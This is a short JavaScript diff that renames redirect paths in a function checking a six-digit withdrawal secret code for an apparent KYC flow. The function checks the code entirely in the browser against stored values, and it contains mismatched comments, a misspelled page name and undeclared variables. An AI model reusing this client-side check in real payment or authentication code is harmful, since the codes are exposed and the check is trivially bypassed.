@@ -59,19 +59,19 @@ function validate_secret_code(kyc1, u_input){
         && kyc1[3]===u_input[3] && kyc1[4]===u_input[4] && kyc1[5]===u_input[5]){
 
             // redirect to login page
-            location.href="/kyc/views/kyc6/withdrawal_success.html";
+            location.href="/kycu/views/kyc6/withdrawal_success.html";
 
     }else if(kyc2[0]===u_input[0] && kyc2[1]===u_input[1] && kyc2[2]===u_input[2]
         && kyc2[3]===u_input[3] && kyc2[4]===u_input[4] && kyc2[5]===u_input[5]){
 
             // redirect to login page
-            location.href="/kyc/views/kyc6/withdrawal_success.html";
+            location.href="/kycu/views/kyc6/withdrawal_success.html";
 
     }else if(kyc3[0]===u_input[0] && kyc3[1]===u_input[1] && kyc3[2]===u_input[2]
         && kyc3[3]===u_input[3] && kyc3[4]===u_input[4] && kyc3[5]===u_input[5]){
 
             // redirect to login page
-            location.href="/kyc/views/kyc6/withdrawal_succcess.html";
+            location.href="/kycu/views/kyc6/withdrawal_succcess.html";
 
     }else{
 
@@ -81,7 +81,7 @@ function validate_secret_code(kyc1, u_input){
         erase_inputs();
         // if the user try wrong pin for some times redirect him to home page
         if(tryal_counter === 2){
-            location.assign("/kyc/views/kyc6/method_select.html");
+            location.assign("/kycu/views/kyc6/method_select.html");
         }
     }
 }
